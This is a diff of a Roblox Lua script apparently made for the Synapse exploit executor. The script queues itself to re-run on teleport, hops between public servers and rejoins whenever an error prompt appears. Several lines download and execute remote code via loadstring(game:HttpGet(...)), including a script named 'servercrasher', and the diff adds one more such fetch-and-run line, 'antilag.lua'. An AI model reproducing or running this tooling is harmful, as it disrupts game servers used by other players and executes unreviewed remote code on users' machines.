@@ -18,8 +18,9 @@ if syn.queue_on_teleport then
         syn.queue_on_teleport('loadstring(game:HttpGet("https://raw.githubusercontent.com/LittleShiQQA/littleshiqqaxds/main/SHA.lua"))()')
     end
 
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/LittleShiQQA/littleshiqqaxds/main/antilag.lua"))()
 
- local Http = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100&cursor="))
+ 	local Http = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100&cursor="))
     
 	for i = 1,100 do
 		for i,v in pairs(Http.data) do
@@ -34,8 +35,7 @@ if syn.queue_on_teleport then
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/0nly6Ex/servercrasher/main/master.lua"))()
 
-
- game.CoreGui.RobloxPromptGui.promptOverlay.Changed:Connect(function()
+game.CoreGui.RobloxPromptGui.promptOverlay.Changed:Connect(function()
     if game.CoreGui.RobloxPromptGui.promptOverlay:FindFirstChild("ErrorPrompt") and game.CoreGui.RobloxPromptGui.promptOverlay:FindFirstChild("ErrorPrompt"):FindFirstChild("MessageArea") then 
          if Decision == "any" then
                     game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, GUIDs[math.random(1,#GUIDs)].id, Player)
